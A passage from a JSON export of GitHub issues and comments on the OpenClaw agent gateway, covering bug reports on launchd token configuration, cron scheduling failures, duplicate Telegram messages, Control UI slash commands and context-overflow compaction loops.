          "id": 3829850112,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4378#issuecomment-3829850112",
          "createdAt": "2026-02-01T00:32:24Z",
          "updatedAt": "2026-02-01T00:32:24Z",
          "author": "sebslight",
          "body": "OpenClaw Maintainer Triage // Issue Closure\n\nHi — this is a joint maintainer effort to keep the repo moving. We’re currently seeing ~30 new issues per hour, and we can’t review every future request without slowing down critical stabilization work. This issue is unlikely to be considered in the near term, so we’re closing it to keep the pipeline moving while we focus on stability.\n\nWe’re very sorry this is happening, but we won’t be able to look at the comments on this issue.\n\nWant to make your request stand out? Submit a PR and report to #pr-thunderdome-dangerzone on Discord — READ THE TOPIC. Give us a clear briefing: what it fixes, who it helps, and why it’s worth shipping.\n\nThanks for understanding and for contributing.\n\n![](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExeXFramtnZWo1ZWM4YmYzcG1zcXE1NWV1eTl3MDZodnk4aWhvM2tqbCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/RWUqVYucDBD4A/giphy.gif)\n"
        },
        {
          "id": 3881021998,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4378#issuecomment-3881021998",
          "createdAt": "2026-02-10T22:12:57Z",
          "updatedAt": "2026-02-10T22:12:57Z",
          "author": "joelgriffith",
          "body": "@tonydehnke thanks for the notes on this as I'm actively looking at it. I'd be interested in getting a PR put together for this, but any help or pointers would be appreciated!\n"
        }
      ]
    },
    {
      "number": 13692,
      "title": "[Bug]: OpenClaw gateway fails to read token when launched via macOS launchd (token_missing_config loop)",
      "body": "Title\n\nOpenClaw gateway fails to read token when launched via macOS launchd (token_missing_config loop)\n\nEnvironment\n • macOS (launchd user agent)\n • OpenClaw bundled runtime (installed in ~/.openclaw)\n • Gateway port: 127.0.0.1:18789\n • Launch agent label: ai.openclaw.gateway\n • Node runtime bundled with OpenClaw\n\nProblem\n\nWhen OpenClaw is installed as a macOS launch agent, the gateway repeatedly fails to start due to missing token configuration even though a valid token is provided via shell environment variables.\n\nThe gateway logs continuously show:\n\nGateway auth is set to token, but no token is configured.\nSet gateway.auth.token (or OPENCLAW_GATEWAY_TOKEN), or pass --token.\n\nThe UI loads, but WebSocket connection fails with:\n\ndisconnected (1008): unauthorized: gateway token missing\n\nPort 18789 does not stay bound because the gateway exits and restarts in a loop.\n\nRoot Cause\n\nWhen OpenClaw is launched via launchd, it does not inherit environment variables from the user shell.\nSetting:\n\nexport OPENCLAW_GATEWAY_TOKEN=...\n\nin terminal has no effect on the launch agent.\n\nAdditionally, manual edits to:\n\n~/.openclaw/openclaw.json\n\nare overwritten on restart by the runtime, so adding gateway.auth.token there does not persist.\n\nAs a result:\n • Gateway requires token\n • Token not visible to launchd environment\n • Gateway enters restart loop\n • UI shows unauthorized\n\nWorkaround\n\nManually inject token into launchd environment:\n\nlaunchctl setenv OPENCLAW_GATEWAY_TOKEN \"<token>\"\nlaunchctl kickstart -k gui/$(id -u)/ai.openclaw.gateway\n\nAfter this:\n • Gateway starts correctly\n • Port 18789 listens\n • UI connects successfully\n • Status becomes Health OK\n\nExpected Behavior\n\nOpenClaw should:\n 1. Either automatically read token from ~/.openclaw/openclaw.json and not overwrite it\n 2. Or provide a stable persistent config location for gateway.auth.token\n 3. Or expose a CLI command to set token for launch agent\n 4. Or document that launchd requires launchctl setenv\n\nCurrently this behavior is undocumented and causes confusing startup failures.\n\nLogs\n\nExample error log:\n\nGateway auth is set to token, but no token is configured.\nSet gateway.auth.token (or OPENCLAW_GATEWAY_TOKEN), or pass --token.\n\nExample working state after workaround:\n\n[gateway] listening on ws://127.0.0.1:18789\nHealth OK\n\nImpact\n • Gateway appears broken after install\n • UI loads but cannot connect\n • Token config silently ignored\n • Users assume install failure\n\nRequires manual macOS launchd knowledge to fix.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13692",
      "createdAt": "2026-02-10T21:55:19Z",
      "updatedAt": "2026-02-10T21:55:19Z",
      "author": "drarturryzhov-boop",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13687,
      "title": "Cron announce delivery sends duplicate messages (messageChannel + announce summary)",
      "body": "## Description\n\nWhen a cron job uses `delivery.mode: \"announce\"` with `channel: \"telegram\"`, **two messages** are delivered to the Telegram chat for each cron run:\n\n1. The agent's text response, forwarded via the session's `messageChannel=telegram`\n2. The announce summary, delivered by the post-run subagent\n\n## Expected Behavior\n\nOnly **one message** should be delivered — either the agent's response OR the announce summary, not both.\n\n## Steps to Reproduce\n\n1. Create a cron job with announce delivery to Telegram:\n   ```\n   openclaw cron add --name \"Test\" --cron \"0 * * * *\" --session isolated --wake now \\\n     --announce --channel telegram --to <chat_id> \\\n     --message \"Output exactly: Hello World\"\n   ```\n2. Trigger the cron: `openclaw cron run <id>`\n3. Observe Telegram: two messages arrive (the agent's direct response + an announce summary)\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Telegram channel\n- `sessionTarget: \"isolated\"`, `wakeMode: \"now\"`\n\n## Investigation\n\nGateway logs show two separate `embedded run start` events per cron execution:\n\n```\nembedded run start: runId=37cc22aa sessionId=37cc22aa messageChannel=telegram  ← agent run\nlane task done (5916ms)\nembedded run start: runId=57821a52 sessionId=2caadd6a messageChannel=telegram  ← announce subagent\n```\n\nThe v2026.2.3 fix (\"suppress messaging tool sends during announce delivery\") only blocks explicit `send_message` tool calls. The agent's text response is still forwarded to Telegram via the session's `messageChannel`, which is a separate code path from messaging tools.\n\n## Attempted Workarounds\n\n| Approach | Result |\n|----------|--------|\n| `delivery.mode: \"announce\"` | 2 messages (agent + summary) |\n| `delivery.mode: \"none\"` | 0 messages (no delivery at all) |\n| Remove `mode` key from delivery | Falls back to announce → 2 messages |\n| `--expect-final` flag | No effect, still 2 messages |\n\n## Suggested Fix\n\nWhen `delivery.mode = \"announce\"`, the agent session's `messageChannel` should either:\n- Not be set to the delivery channel (so text isn't forwarded), OR\n- Be suppressed during the run (similar to how messaging tools are suppressed)",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13687",
      "createdAt": "2026-02-10T21:28:13Z",
      "updatedAt": "2026-02-10T21:50:14Z",
      "author": "reverendrewind",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3880923899,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13687#issuecomment-3880923899",
          "createdAt": "2026-02-10T21:49:07Z",
          "updatedAt": "2026-02-10T21:49:07Z",
          "author": "reverendrewind",
          "body": "**Further testing** — tested 5 models across 4 providers:\n\n| Model | Provider | Messages per cron run |\n|-------|----------|-----------------------|\n| DeepSeek V3 | DeepSeek direct | **1** (correct) |\n| Claude Haiku 4.5 | Anthropic | 2 (duplicate) |\n| MiniMax M2.1 | Synthetic (HuggingFace) | 2 (duplicate) |\n| Qwen3 235B | Synthetic (HuggingFace) | 2 (duplicate) |\n| Kimi K2 0905 | Moonshot | 2 (duplicate) |\n\nDeepSeek V3 is the **only** model that doesn't produce duplicates. This affects all other providers (Anthropic, Synthetic, Moonshot) equally. The DeepSeek API likely returns responses in a format that avoids triggering the `messageChannel` forwarding path."
        },
        {
          "id": 3880928134,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13687#issuecomment-3880928134",
          "createdAt": "2026-02-10T21:50:13Z",
          "updatedAt": "2026-02-10T21:50:13Z",
          "author": "reverendrewind",
          "body": "Closing — this appears to be related to a local configuration change (switching cron models), not an upstream bug. Apologies for the noise."
        }
      ]
    },
    {
      "number": 7189,
      "title": "[Bug]:  Commands Not Working in Control UI",
      "body": "\n## 📋 PROBLEM SUMMARY\n\nThe `/new` command does not work in the **Control UI (webchat)**, while it functions correctly in WhatsApp. The command appears briefly in the chat interface then disappears without being sent to the gateway.\n\n## 🔍 SYMPTOMS\n\n1. **User types `/new` in Control UI**\n2. **Message appears for ~1 second** \n3. **Message disappears from chat**\n4. **No network request sent to gateway**\n5. **No session reset occurs**\n6. **No feedback to user**\n\n## ✅ EXPECTED BEHAVIOR\n\n1. User types `/new` in Control UI\n2. Message is sent to gateway  \n3. Session is reset (new sessionId generated)\n4. User receives confirmation response\n5. Chat history is cleared\n\n## ❌ ACTUAL BEHAVIOR\n\nThe Control UI intercepts the `/new` command locally and removes it from the interface without forwarding it to the gateway server.\n\n## 🧪 EVIDENCE & TESTING\n\n### Test Results\n| Channel | `/new` Command | Result |\n|---------|----------------|--------|\n| WhatsApp | ✅ Works | Session reset, hook triggered, response sent |\n| Control UI | ❌ Failed | Message disappears, no gateway call |\n| Control UI with space | ❌ Failed | ` /new` also intercepted |\n| Control UI with text | ❌ Failed | `/new hello` also intercepted |\n\n### Gateway Logs Analysis\n**WhatsApp `/new` execution (working):**\n```log\n[session-memory] Hook triggered for /new command\nCurrent sessionId: aa0630eb-67ed-4165-90c3-c0ce795e43bb\nsessionFile: /root/.clawdbot/agents/main/sessions/aa0630eb-67ed-4165-90c3-c0ce795e43bb.jsonl\nauto-reply sent (text)\n```\n\n**Control UI `/new` attempt (not working):**\n```log\n# No logs generated - command never reaches gateway\n# Only webchat connection events visible:\nwebchat connected conn=ec8ab40a-a9f9-4c13-8045-c9eff8d78574\n```\n\n### Network Analysis\n- WhatsApp messages generate `web-auto-reply` and `inbound web message` log entries\n- Control UI `/new` generates **no gateway communication logs**\n- Regular Control UI messages work normally and appear in logs\n\n## 🛠 WORKAROUND\n\n**CLI Manual Reset:**\n```bash\nclawdbot gateway call sessions.reset --params '{\"key\": \"agent:main:main\"}'\n```\n\n**Result:**\n- Successfully resets session\n- Generates new sessionId  \n- Clears token counters\n- Requires page refresh to see effect in UI\n\n## 🏗 TECHNICAL ANALYSIS\n\n### Root Cause\nThe Control UI implements **local command interception** for `/new` and `/reset` commands rather than forwarding them to the gateway. This creates inconsistent behavior between channels.\n\n### Code Flow Issue\n1. Control UI recognizes `/new` as special command\n2. Instead of sending to gateway API, processes locally  \n3. Attempts to clear local chat view\n4. Does not trigger server-side session reset\n5. No confirmation response generated\n\n### Session Architecture Context\n- **Session Key:** `agent:main:main` (webchat uses main session)\n- **Session Scope:** `dmScope: \"per-channel-peer\"`  \n- **Reset Triggers:** `[\"/new\", \"/reset\"]` (configured correctly)\n- **Gateway API:** `sessions.reset` method exists and works\n\n## 🎯 PROPOSED FIX\n\n**Option 1: Forward to Gateway (Recommended)**\n- Modify Control UI to send `/new` commands to gateway API\n- Let gateway handle session reset logic consistently  \n- Return response to UI for display\n\n**Option 2: Implement Local Reset Properly**\n- Control UI calls `sessions.reset` API when intercepting `/new`\n- Refresh local session state\n- Display confirmation message\n- Maintain consistent UX\n\n**Option 3: Configuration Option**\n- Add setting to disable local command interception\n- Allow users to choose gateway vs local handling\n\n## 📊 IMPACT ASSESSMENT\n\n**Severity:** Medium  \n**Affected Users:** All Control UI users  \n**Workaround Available:** Yes (CLI command)  \n**Channel Consistency:** Broken (WhatsApp works, Control UI doesn't)\n\n## 🧪 REPRODUCTION STEPS\n\n1. Open Control UI at `http://localhost:18789/`\n2. Type `/new` in chat input\n3. Press Enter\n4. Observe message disappears without effect\n5. Check gateway logs - no `/new` processing\n6. Session continues with same sessionId\n\n## 📋 CONFIGURATION DETAILS\n\n```json5\n{\n  \"session\": {\n    \"dmScope\": \"per-channel-peer\",\n    \"resetTriggers\": [\"/new\", \"/reset\"]\n  },\n  \"commands\": {\n    \"native\": \"auto\",\n    \"nativeSkills\": \"auto\"\n  }\n}\n```\n\n## 🔧 ENVIRONMENT DETAILS\n\n- **Gateway:** local mode, port 18789\n- **UI Client:** clawdbot-control-ui webchat vdev\n- **Sessions:** 4 active sessions\n- **Memory:** Vector ready, FTS ready\n- **Channels:** WhatsApp enabled and working\n\n## 📎 RELATED FILES\n\n- Control UI source code (command interception logic)\n- Gateway session reset implementation (`sessions.reset`)\n- Configuration schema for `resetTriggers`\n- WebSocket message handling in Control UI\n\n---\n\n**Reporter Notes:**  \nThis bug creates significant UX inconsistency between channels and breaks expected command behavior. Users expect `/new` to work the same way across all interfaces. The workaround using CLI is not user-friendly for non-technical users.\n\n**Verification:** Bug confirmed through testing, log analysis, and successful CLI workaround.",
      "state": "open",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189",
      "createdAt": "2026-02-02T14:41:15Z",
      "updatedAt": "2026-02-10T21:48:14Z",
      "author": "karlisbergmanis-lv",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3847940269,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189#issuecomment-3847940269",
          "createdAt": "2026-02-04T14:55:34Z",
          "updatedAt": "2026-02-04T14:55:34Z",
          "author": "MarceloVasquez",
          "body": "I've been experimenting the same issue not only with the /new command but also /status/help or any of the other /commands in the web chat UI. I tried to replicate the problem and I did a clean new install and everything was working fine until I installed the WhatsApp channel. After finishing the binding of my phone to the WhatsApp channel with \"dmScope\": \"per-channel-peer\", this behavior started to happen again. So I think there is something related to the WhatsApp channel or the dmScope per-channel-peer condition, the permissions around sessions and some sort of security trigger that censors the /command. It seems that it doesn't recognize that you have the permission to enter that command in the UI"
        },
        {
          "id": 3867674033,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189#issuecomment-3867674033",
          "createdAt": "2026-02-08T17:23:04Z",
          "updatedAt": "2026-02-08T17:23:04Z",
          "author": "Volstritas",
          "body": "It is still unresolved. It does affect a relatively large number of users. \n\nI've tried applying the recommended fixes in this thread, but to no avail. "
        },
        {
          "id": 3871484273,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189#issuecomment-3871484273",
          "createdAt": "2026-02-09T12:41:40Z",
          "updatedAt": "2026-02-09T12:41:40Z",
          "author": "theabhishek2511",
          "body": "Unresolved here too, running 2026.2.6-3. I also have a problem where it won't work on telegram either."
        },
        {
          "id": 3873046275,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189#issuecomment-3873046275",
          "createdAt": "2026-02-09T17:43:50Z",
          "updatedAt": "2026-02-09T17:43:50Z",
          "author": "mpcabete",
          "body": "experiencing the same issue on 2.6-3"
        },
        {
          "id": 3880919839,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7189#issuecomment-3880919839",
          "createdAt": "2026-02-10T21:48:14Z",
          "updatedAt": "2026-02-10T21:48:14Z",
          "author": "etairaz",
          "body": "Reproducible here. 2026.2.9\nWorks in Telegram and Whatsapp. Doesn't work in web ui and tui."
        }
      ]
    },
    {
      "number": 13685,
      "title": "[Bug]: My Bot loses exec all the time and sends me manuell shell comands how to fix?",
      "body": "[Bug]: My Bor loses exec all the time and sends me manuell shell comands how to fix?",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13685",
      "createdAt": "2026-02-10T21:27:43Z",
      "updatedAt": "2026-02-10T21:28:30Z",
      "author": "patchguardio",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13682,
      "title": "System events delayed by active session queue",
      "body": "When the session is actively processing user messages, system events (errors, warnings, restart notifications) queue behind them and can arrive minutes late. In one case, a gateway restart error from 16:12 didn't surface until 16:17 because the session was continuously busy with user chat.\n\nThis makes error notifications unreliable during active use, which is exactly when they matter most.\n\nPossible approaches:\n- Priority lane so system events skip ahead of queued user messages\n- Separate delivery channel for errors that bypasses the session queue entirely\n- At minimum, visible timestamps on system events so the delay is obvious\n\nCurrent behavior: system events enter the same FIFO queue as user messages and get indefinitely deferred during active conversation.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13682",
      "createdAt": "2026-02-10T21:18:58Z",
      "updatedAt": "2026-02-10T21:18:58Z",
      "author": "1kuna",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 12025,
      "title": "Cron scheduler never executes recurring jobs (kind: 'cron' and kind: 'every')",
      "body": "## Bug Description\n\nRecurring cron jobs with `schedule.kind: \"cron\"` and `schedule.kind: \"every\"` are never executed by the scheduler. The scheduler correctly:\n- Starts and logs `cron: started` with the correct `nextWakeAtMs`\n- Calculates and advances `nextRunAtMs` on schedule\n- Persists state to `jobs.json`\n\nBut it **never enqueues jobs to the cron execution lane**. One-shot `schedule.kind: \"at\"` jobs work correctly.\n\n## Environment\n- **Version:** v2026.2.6-3 (also reproduced on v2026.2.3-1)\n- **OS:** Ubuntu 22.04 (Linux 6.8.0-90-generic x64)\n- **Node:** v22.22.0\n- **Install:** npm global (`/usr/lib/node_modules/openclaw`)\n- **Config:** `cron.enabled: true` (default), no `OPENCLAW_SKIP_CRON`, `maxConcurrentRuns: 1` (default)\n- **Service:** systemd user-level service\n\n## Reproduction\n\n1. Create a recurring cron job:\n```json\n{\n  \"name\": \"test-every-5m\",\n  \"schedule\": { \"kind\": \"every\", \"everyMs\": 300000 },\n  \"sessionTarget\": \"isolated\",\n  \"payload\": { \"kind\": \"agentTurn\", \"message\": \"Say hello\" }\n}\n```\n\n2. Confirm `openclaw cron status` shows the job and correct `nextWakeAtMs`\n3. Wait past the scheduled time\n4. Check `openclaw cron runs --id <jobId>` — no new entries appear\n5. Check `nextRunAtMs` in jobs.json — it has advanced past the due time without executing\n\n## Evidence from logs\n\n### Gateway process running Feb 6 05:17 → Feb 8 05:46 (2.5 days):\n\n- **ZERO** `lane=cron` entries in the entire log (grepped all 18MB)\n- Cron scheduler logged `cron: started` and kept updating `nextWakeAtMs` every cycle\n- The scheduler wake timestamps advanced correctly through the entire period\n- But no job was ever enqueued to the cron execution lane\n\n### Post-restart (fresh gateway):\n- One-shot `kind: \"at\"` job fired correctly ✅\n- Recurring `kind: \"cron\"` jobs at the same time did NOT fire ❌\n- Converted jobs to `kind: \"every\"` — also did NOT fire ❌\n\n### Timeline:\n- Feb 5: Last successful runs of memory-monitor, daily-workspace-backup\n- Feb 6 05:17: Gateway restarted (OpenClaw migration). Cron scheduler started. No jobs ever fired from this point.\n- Feb 6 22:01: Last `nextWakeAtMs` log entry, scheduler went completely silent\n- Feb 7: Entire day — no cron executions despite gateway running continuously\n- Feb 8 05:46: Manual restart. One-shot `at` job worked, recurring jobs still broken\n- Feb 8 06:20: Updated to v2026.2.6-3. Still broken.\n- Feb 8 06:20: Converted to `kind: \"every\"`. Still broken.\n\n## Key log excerpts\n\nCron scheduler starts correctly:\n```\n2026-02-08T05:46:52.549Z cron: started {enabled: true, jobs: 7, nextWakeAtMs: 1770530400000}\n```\n\nOne-shot job enqueues and runs:\n```\n2026-02-08T06:05:01.430Z lane enqueue: lane=session:agent:main:cron:e0386b45... queueSize=1\n2026-02-08T06:05:01.448Z lane enqueue: lane=cron queueSize=1\n```\n\nBut zero equivalent entries for any recurring job across the entire observation period.\n\n## Workaround\n\nUsing system crontab to call `openclaw cron run <jobId> --force` on schedule.\n\n## Changelog note\n\nv2026.2.6 changelog mentions: \"Cron: scheduler reliability (timer drift, restart catch-up, lock contention, stale running markers)\" — but the issue persists on v2026.2.6-3.",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12025",
      "createdAt": "2026-02-08T18:37:15Z",
      "updatedAt": "2026-02-10T21:15:38Z",
      "author": "dperalta716",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3868057826,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12025#issuecomment-3868057826",
          "createdAt": "2026-02-08T19:35:29Z",
          "updatedAt": "2026-02-08T19:35:29Z",
          "author": "tomron87",
          "body": "We hit this same bug independently — filed #12051 before finding this issue, closing it as a duplicate.\n\nAdding some extra evidence that might help narrow the root cause:\n\n**Environment:** macOS arm64, Node.js v25.2.1, OpenClaw v2026.2.6-3 (also v2026.2.3-1)\n\n**Key finding — `TimeoutOverflowWarning` in logs:**\n\n```\n2026-02-06T19:08:08.996Z (node:27398) TimeoutOverflowWarning: 2592010000 does not fit into a 32-bit signed integer.\n```\n\nThis suggests the scheduler is calling `setTimeout()` with a delay exceeding `2^31 - 1` ms (≈24.8 days). When Node.js receives a value that overflows a 32-bit signed int, `setTimeout` behavior becomes unpredictable — the timer may fire immediately or not at all.\n\nThe value `2592010000` ms ≈ 30 days, which could come from stale `nextRunAtMs` state or an incorrect delay calculation between scheduler start and next run.\n\n**Same pattern as your report:**\n- Daily cron job `0 21 * * *` (tz: Asia/Jerusalem)\n- Scheduler starts correctly, calculates nextWakeAtMs, but never enqueues to the cron lane\n- `cron run --jobId <id>` returns `not-due`\n- One-shot `kind: \"at\"` jobs fire correctly ✅\n- Recurring `kind: \"cron\"` jobs silently skip ❌\n- Persisted across gateway restarts, job deletion/recreation, and wakeMode changes\n- Reproduced for 4+ consecutive days\n\n**Suggested fix:** Chunk `setTimeout` delays to stay under `2^31 - 1` ms, or switch to a short-interval `setInterval` tick that compares against `Date.now()`."
        },
        {
          "id": 3880332891,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12025#issuecomment-3880332891",
          "createdAt": "2026-02-10T19:46:27Z",
          "updatedAt": "2026-02-10T19:46:27Z",
          "author": "tomron87",
          "body": "**Update (Feb 10):** Upgraded to v2026.2.9 which includes \"Cron: share isolated announce flow and harden scheduling/delivery reliability\" (#11641). **Issue persists.** Recurring `kind: \"cron\"` jobs still silently skip. Run history shows zero new executions after the update.\n\nAt this point we've tried every available workaround:\n- v2026.2.3-1 → v2026.2.6-3 → v2026.2.9 (three versions, same bug)\n- `wakeMode: \"now\"` vs `\"next-heartbeat\"`\n- Deleting and recreating the job\n- Gateway restarts\n\nOne-shot `kind: \"at\"` jobs continue to work fine. The issue is specific to recurring schedules (`kind: \"cron\"` and presumably `kind: \"every\"`).\n\nCurrently working around it with a macOS launchd agent calling `openclaw cron run <jobId>` on a timer."
        },
        {
          "id": 3880756175,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12025#issuecomment-3880756175",
          "createdAt": "2026-02-10T21:15:38Z",
          "updatedAt": "2026-02-10T21:15:38Z",
          "author": "jackcodez",
          "body": "Same here - cron jobs are never working. Last known version when they were working reliably was 2026.2.2"
        }
      ]
    },
    {
      "number": 13624,
      "title": "Auto-compaction death spiral: overflow recovery fails when transcript is too large to compact",
      "body": "## Bug Description\n\nAuto-compaction overflow recovery enters a death spiral when the session transcript is large enough that even the compaction request itself triggers a context overflow.\n\n## Reproduction\n\n1. Agent session accumulates a large transcript (2.4MB JSONL, 627 messages)\n2. Context usage shows 108k/200k (54%) in `/status` — but actual prompt assembly exceeds 200k\n3. Every subsequent message returns: `Context overflow: prompt too large for the model`\n4. Auto-compaction retry loop (max 3 attempts) fails because each compaction attempt also overflows\n5. Session is permanently stuck — only `/reset` recovers it\n\n## Expected Behavior\n\nThe overflow recovery mechanism should handle this gracefully:\n- If compaction itself overflows, truncate/drop older transcript entries more aggressively before retrying\n- After exhausting retries, suggest `/reset` to the user instead of repeating the same error\n- Ideally, prevent reaching this state via threshold-based compaction before overflow\n\n## Observed Behavior\n\n- `compactionCount` stays at 0 — compaction never succeeds\n- The same \"Context overflow\" error is returned for every message\n- User sees repeated identical error messages with no way to recover except manual `/reset`\n\n## Environment\n\n- OpenClaw 2026.2.6-3\n- Model: anthropic/claude-opus-4-6 (200k context)\n- Session: agent:milan:main\n- Transcript size at failure: 2.4MB, 627 messages\n\n## Configuration\n\n```json\n\"compaction\": {\n  \"mode\": \"safeguard\",\n  \"reserveTokensFloor\": 50000\n}\n```\n\n(User has since increased `reserveTokensFloor` to 80000 as a mitigation.)\n\n## Suggested Fix\n\n1. When overflow recovery detects that compaction itself overflows, perform aggressive transcript truncation (keep only last N messages) before retrying\n2. Add a fallback that auto-resets the session after exhausting compaction retries\n3. The `/status` context counter (108k/200k) appears stale/inaccurate — it should reflect the actual prompt size being assembled\n\n## Additional Context\n\nThis is the second occurrence of this bug for this user (first on 2026-02-08, second on 2026-02-10). Both times affected different agents on the same OpenClaw instance.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13624",
      "createdAt": "2026-02-10T19:26:31Z",
      "updatedAt": "2026-02-10T21:14:23Z",
      "author": "hrebikodo",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880649410,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13624#issuecomment-3880649410",
          "createdAt": "2026-02-10T20:52:39Z",
          "updatedAt": "2026-02-10T20:52:39Z",
          "author": "Takhoffman",
          "body": "Hi.  I plan to add more logging to the gateway in the next release to diagnose these kinds of failures.  Is gathering gateway logs something you would be able to do?"
        },
        {
          "id": 3880751044,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13624#issuecomment-3880751044",
          "createdAt": "2026-02-10T21:14:23Z",
          "updatedAt": "2026-02-10T21:14:23Z",
          "author": "hrebikodo",
          "body": "Thanks for looking into this! Two quick questions before we proceed:\n\n1. **What would the new logging capture?** Specifically, would it include conversation content/message text, or just operational data (timestamps, token counts, error codes, code paths hit)?\n\n2. **How would we share the logs?** Manual collection and upload to this issue, or some kind of automatic telemetry?\n\nWe're happy to help gather diagnostic data — just want to understand the scope first. We can reproduce the issue reliably if needed."
        }
      ]
    },
    {
      "number": 13664,
      "title": "[Bug]:macOS DMG + Linux VPS, gateway unreachable",
      "body": "Summary\n\nOpenClaw gateway is consistently unreachable at localhost:18789 and health checks fail.\nThe issue reproduces in two environments:\n 1. macOS (Mac mini) installed via DMG GUI app — GUI starts, but gateway never binds to the port.\n 2. Linux VPS (installed via script + systemd user service) — gateway/service enters crash/restart behavior and RPC probe fails.\n\nThis blocks dashboard/client usage entirely.\n\n⸻\n\nImpact\n • Dashboard cannot connect\n • Health check always fails\n • Gateway does not reliably start/bind\n • Reinstall/reset does not resolve\n • Reproducible across machines/OSes\n\n⸻\n\nEnvironment\n\nmacOS (primary)\n • Device: Mac mini\n • Install method: DMG (GUI app)\n • Version: OpenClaw 2026.2.3-1\n • CLI: not available (openclaw not found in PATH; bundle contains only OpenClaw)\n • VPN: removed during debugging\n\nLinux VPS (secondary test)\n • OS: Linux VPS\n • Install method: official install script\n • Version: OpenClaw 2026.2.3-1\n • Service: systemd user service (openclaw-gateway.service)\n • Bind: loopback (127.0.0.1)\n • Port: 18789\n • Observed: service “loaded” but exits immediately / restarts; RPC probe fails; WS abnormal closure (1006)\n\n⸻\n\nSteps to reproduce\n\nmacOS (DMG)\n 1. Install OpenClaw via DMG\n 2. Launch the OpenClaw app\n 3. App health check attempts to reach localhost:18789\n 4. Health check fails, dashboard cannot connect\n\n⸻\n\nLinux VPS\n 1. Install OpenClaw via official script\n 2. Start gateway via systemd user service\n 3. RPC probe/health check targets ws://127.0.0.1:18789\n 4. Gateway fails / service exits immediately / auto-restart loop\n\n⸻\n\nExpected behavior\n • Gateway starts successfully\n • Binds to 127.0.0.1:18789 (or configured port)\n • Health check passes\n • Dashboard connects locally (macOS) or via tunnel (VPS)\n\n⸻\n\nActual behavior\n\nHealth check failure:\n\nHealth check failed: Cannot reach gateway at localhost:18789; ensure the gateway is running.\n\nmacOS evidence\n • GUI process is running, but gateway is not:\n\nps aux | grep -i claw\n→ /Applications/OpenClaw.app/Contents/MacOS/OpenClaw (GUI running)\n\nps aux | grep -i node\n→ no node/gateway process visible\n\nlsof -nP -iTCP:18789 -sTCP:LISTEN\n→ nothing listening (port closed)\n\nSo the GUI appears to fail spawning the gateway (or it exits immediately).\n\nLinux VPS evidence (earlier attempts)\n • systemd user service loads but exits immediately / auto-restarts\n • RPC probe fails against ws://127.0.0.1:18789\n • WebSocket “1006 abnormal closure”\n • Doctor previously reported gateway.mode unset and missing config during early attempts; fixes were attempted but gateway still failed to remain running\n\n⸻\n\nTroubleshooting already attempted\n • Multiple reinstalls (macOS DMG and Linux install script)\n • VPN removal on macOS\n • System reboot\n • Running doctor and applying suggested fixes (Linux)\n • Token generation/config attempts (Linux)\n • systemd restarts and daemon restarts (Linux)\n • Process and port inspection (macOS)\n\nIssue persists.\n\n⸻\n\nQuestions / Request for guidance\n 1. Is there a known issue where the macOS DMG GUI app fails to spawn the gateway (no port bind, no node process)?\n 2. Are there debug flags / verbose logs for gateway startup, especially for DMG installs?\n 3. Could this be a shared gateway startup regression in 2026.2.3-1 (given reproduction on Linux + macOS)?\n 4. What commands/log locations should be collected for a complete report?",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13664",
      "createdAt": "2026-02-10T20:36:47Z",
      "updatedAt": "2026-02-10T21:11:12Z",
      "author": "drarturryzhov-boop",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880736424,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13664#issuecomment-3880736424",
          "createdAt": "2026-02-10T21:11:12Z",
          "updatedAt": "2026-02-10T21:11:12Z",
          "author": "drarturryzhov-boop",
